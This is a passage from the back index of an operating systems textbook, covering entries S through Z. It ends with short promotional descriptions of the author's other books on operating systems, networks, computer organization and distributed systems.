SR-IOV (see Single Root I/O Virtualization)
SSD (see Solid State Disk)
SSF (see Shortest Seek First disk scheduling)
St. Exupéry, Antoine de, 985-986
Stable read, 386
Stable storage, 385-388
Stable write, 386
Stack canary, 642-644
Stack pointer, 21
Stack segment, 56
Standard error, 727
Standard input, 727
Standard output, 727
Standard UNIX, 718
Standby list, 930
Standby mode, 965
Star property, 613
Starting processes, Android, 845
Starvation, 169, 463-464
Stat, 54, 57, 782, 786, 788
Stateful file system, NFS, 798
Stateful firewall, 687
Stateless file system, NFS, 795

Stateless firewall, 686
Static relocation, 185
Static vs. dynamic structures, 1002-1003
Steganography, 617-619
Storage allocation, NTFS, 958-962
Store manager, Windows, 941
Store-and-forward packet switching, 547-548
Stored-value card, 634
Strict alternation, 123-124
Striping, RAID, 372
Structure, operating system, 993-997
Stuxnet attack on nuclear facility, 598
Subject, security, 605
Substitution cipher, 620
Subsystem, 864
Subsystems, Windows, 905-908
Summary of page replacement algorithms, 221-22
Superblock, 282, 784, 785
SuperFetch, 934
Superscalar computer, 22
Superuser, 41, 800
Supervisor mode, 1
Suspend blocker, Android, 810
Svchost.exe, 907
SVID (see System V Interface Definition)
SVM (see Secure Virtual Machine)
Swap area, Linux, 765
Swap file, Windows, 942
Swapper process, Linux, 764
Swappiness, Linux, 766
Swapping, 187-190
Switching multiprocessor, 523-525
SwitchToFiber, 910
Symbian, 19
Symbolic link, 281, 291
Symmetric multiprocessor, 533-534
Symmetric-key cryptography, 620-621
Sync, 316, 317, 767
Synchronization, barrier, 146-148
Linux, 750-751
multiprocessor, 534-537
Windows, 917-919
Synchronization event, Windows, 918
Synchronization object, 886
Synchronization using semaphores, 132
Synchronized method, Java, 143
Synchronous call, 553-554
Synchronous I/O, 352
Synchronous vs. asynchronous communication, 1004-1005
System access control list, 969
System bus, 20
System call, 22, 50-62
System-call interface, 991
System calls (see also Windows API calls) directory management, 57-59
file management, 56-57
Linux file system, 780-783
Linux I/O, 770-771
Linux memory management, 756-758
Linux process management, 736-739
Linux security, 801
miscellaneous, 59-60
process management, 53-56
System on a chip, 528
System process, Windows, 914
System structure, Windows, 877-908
System V, 14
System V interface definition, 718
System/360, 10

## T

Tagged architecture, 608
Task, Linux, 740
TCB (see Trusted Computing Base)
TCP (see Transmission Control Protocol)
TCP/IP, 717
Team structure, 1019-1021
TEB (see Thread Environment Block)
Template, Linda, 585
Termcap, 400
Terminal, 394
Terminal server, 927
TerminateProcess, 91
Test and set lock, 535
Text segment, 56, 754
Text window, 399-400
THE operating system, 64-65
Thermal management, 424
Thin client, 416-417
Thompson, Ken, 715
Timer, high resolution, 747
Thrashing, 216
Thread, 97-119
hybrid, 112-113
kernel, 111-112
Linux, 743-746

Thread (continued)
user-space, 108-111
Windows, 908-927
Thread environment block, 908
Thread local storage, 908
Thread management API calls in Windows, 914-919
Thread of execution, 103
Thread pool, Windows, 911-914
Thread scheduling, 166-167
Thread table, 109
Thread usage, 97-102
Threads, POSIX, 106-108
Threat, 596-598
Throughput, 155
Tightly coupled distributed system, 519
Time, 54, 60
Time bomb, 658
Time of check to time of use attack, 656-657
Time of day, 390
Time sharing, multiprocessor 540-542
Timer, 388
Timesharing, 12
TinyOS, 37
TLB (see Translation Lookaside Buffer)
TOCTOU (see Time Of Check to Time Of Use attack)
Token, 874
Top-down implementation, 1003-1004
Top-down vs. bottom-up implementation, 1003-1004
Topology, multicomputer, 547-549
Torvalds, Linus, 14, 720
Touch screen, 414-416
TPM (see Trusted Platform Module)
Track, 28
Transaction, Android, 817
Transactional memory, 909
Transfer model, 577-678
Translation lookaside buffer, 202-203, 226, 933, hard miss
soft miss, 204
Transmission control protocol, 575, 770
Transparent page sharing, 494
Trap, 51-52
Trap system call, 22
Trap-and-emulate, 476
Traps vs. binary translation, 482
Trends in operating system design, 1022-1026
Triple indirect block, 324, 790
Trojan horse, 663-664
TrueType fonts, 413
Trusted computing base, 601
Trusted platform module, 624-626
Trusted system, 601
TSL instruction, 126-127
Tuple, 584
Tuple space, 584
Turing, Alan, 7
Turnaround time, 155
Two-level multiprocessor scheduling, 541
Two-phase locking, 459
Type 1 hypervisor, 70, 477-478
VMware, 511-513
Type 2 hypervisor, 72, 477-478, 481

## U

UAC (see User Account Control)
UDF (see Universal Disk Format)
UDP (see User Datagram Protocol)
UEFI (see Unified Extensible Firmware Interface)
UID (see User ID)
UMA (see Uniform Memory Access)
UMA multiprocessor, bus-based, 520-521
crossbar, 521-523
switching, 523-525
UMDF (see User-Mode Driver Framework)
Umount, 54, 59
UMS (see User-Mode Scheduling)
Undefined external, 230
Unicode, 870
UNICS, 714
Unified extensible firmware interface, 893
Uniform memory access, 520
Uniform naming, 351
Uniform resource locator, 576
Universal Coordinated Time, 389
Universal disk format, 284
Universal serial bus, 33
UNIX, 14, 17-18
history, 714-722
PDP-11, 715-716
UNIX 32V, 717
UNIX password security, 630-632
UNIX system V, 14
UNIX V7 file system, 323-325
Unlink, 54, 58, 82, 281, 783
Unmap, 758
Unmarshalling, 822

Unsafe state, 452-453
Up operation on semaphore, 130
Upcall, 114
Upload/download model, 577
URL (see Uniform Resource Locator)
USB (see Universal Serial Bus)
Useful techniques, 1005-1010
User account control, 972
User datagram protocol, 770
User ID, 40, 604, 798
User interface paradigm, 988
User interfaces, 394-399
User mode, 2
User shared data, 908
User-friendly software, 16
User-level communication software, 553-556
User-mode driver framework, Windows, 948
User-mode scheduling, Windows, 912
User-mode services, Windows, 905-908
User-space I/O software, 367-369
User-space thread, 108-111
UTC (see Universal Coordinated Time)

## V

V operation on semaphore, 130
V-node, NFS, 795
VAD (see Virtual Address Descriptor)
ValidDataLength, 943
Vampire tap, 569
Vendor lock-in, 496
Vertical integration, 500
VFS (see Virtual File System)
VFS interface, 297
Video RAM, 340, 405
Virtual address, 195
guest, 488
Virtual address allocation, Windows, 929-931
Virtual address descriptor, 933
Virtual address space, 195
Linux, 763-764
Virtual appliance, 493
Virtual disk, 478
Virtual file system, 296-299
Linux, 731-732, 784-785
Virtual function, 493
Virtual hardware platform, 506-508
Virtual i-node, NFS, 795
Virtual kernel mode, 479
Virtual machine, 69-72
licensing, 494-495
Virtual machine interface, 485
Virtual machine migration, 496-497
Virtual machine monitor, 472 (see also Hypervisor)
Virtual machines on multicore CPUs, 494
Virtual memory, 28, 50, 188, 194-208
paging, 194-240
segmentation, 240-252
Virtual memory interface, 232
Virtual processor, 879
VirtualBox, 474
Virtualization, 471-515
cost, 482
I/O, 490-493, 492-493
memory, 486-490
process-level, 477
requirements, 474-477
x86, 500-502
Virtualization and the cloud, 1023
Virtualization techniques, 478-483
Virtualization technology, 476
Virtualizing the unvirtualizable, 479
Virus, 595, 664-674
boot sector, 669-670
cavity, 668
companion, 665-666
device driver, 671
executable program, 666-668
macro, 671
memory-resident, 669
overwriting, 666
parasitic, 668
polymorphic, 689-691
source code, 672
Virus avoidance, 692-693
Virus payload, 665
Virus scanner, 687
Viruses, operation, 665
Viruses distribution, 672-674
Vista, Windows, 17
VM exit, 487
VM/370, 69-70, 474
VMI (see Virtual Machine Interface)
VMM (see Virtual Machine Monitor)
VMotion, 499
VMware, 474, 498-514
history, 498-499
VMware ESX server, 481

VMware workstation, 478
VMware Workstation, 498-500
Linux, 498
Windows, 498
VMX, 509
VMX driver, 509
Volume shadow copy, Windows, 944
VT (see Virtualization Technology)
Vulnerability, 594

## W

Wait, 139, 140, 356
WaitForMultipleObjects, 886, 895, 918, 977
WaitForSingleObject, 918
WaitOnAddress, 919
Waitpid, 54-55, 55, 56, 736, 737, 738
Waitqueue, 750
Wake lock, Android, 810-813
WakeByAddressAll, 919
WakeByAddressSingle, 919
Wakeup, 127-130, 128
Wakeup waiting bit, 129
WAN (see Wide Area Network)
War dialer, 629
Watchdog timer, 392
WDF (see Windows Driver Foundation)
WDK (see Windows Driver Kit)
WDM (see Windows Driver Model)
Weak passwords, 628
Web app, 417
Web browser, 576
Web page, 576
White hat, 597
Wide area network, 568-569
Widget, 402
Wildcard, 607
WIMP, 405
Win32, 60-62, 860, 871-875
Window, 406
Window manager, 402
Windows 2000, 17, 861
Windows 3.0, 860
Windows 7, 17, 863-864
Windows 8, 857-976
Windows 8.1, 864
Windows 95, 16, 859
Windows 98, 16, 859
Windows API call
I/O, 945-948
memory management, 931-932
process management, 914-919
security, 969-970
Windows API calls (see AddAccessAllowedAce, AddAccessDeniedAce, BitLocker, CopyFile, CreateFile, CreateFileMapping, CreateProcess, CreateSemaphore, DebugPortHandle, DeleteAce, DuplicateHandle, EnterCriticalSection, ExceptPortHandle, GetTokenInformation, InitializeAcl, InitOnceExecuteOnce, InitializeSecurityDescriptor, IoCallDrivers, IoCompleteRequest, IopParseDevice, LeaveCriticalSection, LookupAccountSid, ModifiedPageWriter, NtAllocateVirtualMemory, NtCancelIoFile, NtClose, NtCreateFile, NtCreateProcess, NtCreateThread, NtCreateUserProcess, NtDeviceIoControlFile, NtDuplicateObject, NtFlushBuffersFile, NtFsControlFile, NtLockFile, NtMapViewOfSection, NtNotifyChangeDirectoryFile, NtQueryDirectoryFile, NtQueryInformationFile, NtQueryVolumeInformationFile, NtReadFile, NtReadVirtualMemory, NtResumeThread, NtSetInformationFile, NtSetVolumeInformationFile, NtUnlockFile, NtWriteFile, NtWriteVirtualMemory, ObCreateObjectType, ObOpenObjectByName, OpenSemaphore, ProcHandle, PulseEvent, QueueUserAPC, ReadFile, ReleaseMutex, ReleaseSemaphore, ResetEvent, SectionHandle, SetEvent, SetPriorityClass, SetSecurityDescriptorDacl, SetThreadPriority, SwitchToFiber, ValidDataLength, WaitForMultipleObjects, WaitForSingleObject, WaitOnAddress, WakeByAddressAll, WakeByAddressSingle)
Windows critical section, 917-919
Windows defender, 974
Windows device driver, 891-893
Windows driver foundation, 948
Windows driver kit, 948
Windows driver model, 948
Windows event, 918
Windows executive, 887-891
Windows fiber, 909-911
Windows file system, introduction, 953-954
Windows I/O, 943-952
implementation, 948-952
introduction, 944-945

Windows IPC, 916-917
Windows job, 909-911
Windows kernel, 882
Windows Me, 17, 859
Windows memory management, 927-942
implementation, 933-942
introduction, 928-931
Windows memory management API calls, 931-932
Windows metafile, 412
Windows notification facility, 890
Windows NT, 16, 860
Windows NT 4.0, 861, 891
Windows NT file system, 265-266, 952-964
introduction, 952-954
implementation, 954-964
Windows page replacement algorithm, 937-939
Windows page-fault handling, 934-937
Windows pagefile, 930-931
Windows power management, 964-966
Windows process, introduction, 908-914
Windows process management API calls, 914-919
Windows process scheduing, 922-927
Windows processes, 908-927
introduction, 908-914
implementation, 919-927
Windows programming model, 864-877
Windows registry, 875-877
Windows security, 966-975
implementation, 970-975
introduction, 967-969
Windows security API calls, 969-970
Windows subsystems, 905-908
Windows swap file, 942
Windows synchronization, 917-919
Windows synchronization event, 918
Windows system process, 914
Windows system structure, 877-908
Windows thread, 908-927
Windows thread pool, 911-914
Windows threads, implementation, 919-927
Windows update, 974
Windows Vista, 17, 862-863
Windows XP, 17, 861
Windows-on-Windows, 872
WinRT, 865
WinTel, 500
WMware Workstation, evolution, 511
WndProc, 409
WNF (see Windows Notification Facility)
Worker thread, 100
Working directory, 43, 278, 777
Working set, 216
Working set model, 216
Working set page replacement algorithm, 215
World switch, 482, 510
Worm, 595, 674-676
Morris, 674-676
Wormhole routing, 548
Worst fit algorithm, 193
WOW (see Windows-on-Windows)
Wrapper (around system call), 110
Write, 54, 57, 273, 275, 297, 298, 317, 364, 367, 580, 603, 696, 756, 767, 768, 770, 781, 782, 785, 791, 797, 802
Write-through cache, 317
WSClock page replacement algorithm, 219
W^X, 644

## X

X, 401-405
X client, 401
X Intrinsics, X11, 401
X resource, 403
X server, 401
X window system, 18, 401-405, 720, 725
X11 (see X window system)
X86, 18
X86-32, 18
X86-64, 18
Xen, 474
Xlib, 401
XP (see Windows XP)

## Z

Z/VM, 69
Zero day attack, 974
ZeroPage thread, 941
Zombie, 598, 660
Zombie software, 639
Zombie state, 738
ZONE_DMA, Linux, 758
ZONE_DMA32, Linux, 758
ZONE_HIGHMEM, Linux, 758
ZONE_NORMAL, Linux, 758
Zuse, Konrad, 7
Zygote, 809-810, 815-816, 845-846

This page intentionally left blank

## Also by Andrew S. Tanenbaum and Albert S. Woodhull

## Operating Systems: Design and Implementation, 3rd ed.

All other textbooks on operating systems are long on theory and short on practice. This one is different. In addition to the usual material on processes, memory management, file systems, I/O, and so on, it contains a CD-ROM with the source code (in C) of a small, but complete, POSIX-conformant operating system called MINIX 3 (see www.minix3.org). All the principles are illustrated by showing how they apply to MINIX 3. The reader can also compile, test, and experiment with MINIX 3, leading to in-depth knowledge of how an operating system really works.

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-564_1344_988_694_269.jpg)

## Also by Andrew S. Tanenbaum and David J. Wetherall

## Computer Networks, 5th ed.

This widely read classic, with a fifth edition co-authored with David Wetherall, provides the ideal introduction to today’s and tomorrow’s networks. It explains in detail how modern networks are structured. Starting with the physical layer and working up to the application layer, the book covers a vast number of important topics, including wireless communication, fiber optics, data link protocols, Ethernet, routing algorithms, network performance, security, DNS, electronic mail, the World Wide Web, and multimedia. The book has especially thorough coverage of TCP/IP and the Internet.

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-565_1288_981_695_271.jpg)

## Also by Andrew S. Tanenbaum and Todd Austin

## Structured Computer Organization, 6th ed.

Computers are getting more complicated every year but this best-selling book makes computer architecture and organization easy to understand. It starts at the very beginning explaining how a transistor works and from there explains the basic circuits from which computers are built. Then it moves up the design stack to cover the microarchitecture, and the assembly language level. The final chapter is about parallel computer architectures. No hardware background is needed to understand any part of this book.

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-566_1303_990_658_267.jpg)

## Also by Andrew S. Tanenbaum and Maarten van Steen

## Distributed Systems: Principles and Paradigms, 2nd ed.

Distributed systems are becoming ever-more important in the world and this book explains their principles and illustrates them with numerous examples. Among the topics covered are architectures, processes, communication, naming, synchronization, consistency, fault tolerance, and security. Examples are taken from distributed object-based, file, Web-based, and coordination-based systems.

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-567_1390_996_616_264.jpg)